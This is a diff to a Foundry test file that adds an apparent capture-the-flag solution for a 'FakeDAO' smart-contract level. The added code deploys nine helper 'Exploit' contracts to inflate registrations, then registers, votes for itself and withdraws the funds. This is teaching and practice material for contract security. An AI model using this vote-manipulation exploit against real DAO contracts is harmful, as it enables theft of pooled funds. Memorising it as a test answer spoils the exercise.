@@ -3,6 +3,7 @@ pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
 import "src/10_FakeDAO/FakeDAO.sol";
+import {console} from "forge-std/console.sol";
 
 // forge test --match-contract FakeDAOTest -vvvv
 contract FakeDAOTest is BaseTest {
@@ -16,6 +17,16 @@ contract FakeDAOTest is BaseTest {
 
     function testExploitLevel() public {
         /* YOUR EXPLOIT GOES HERE */
+        for(uint i = 0; i < 9; i++) {
+            Exploit ex = new Exploit(instance);
+            console.log("current counter", i + 1);
+        }
+
+        instance.register();
+        console.log("Attacker Registered");
+
+        instance.voteForYourself();
+        instance.withdraw();
 
         checkSuccess();
     }
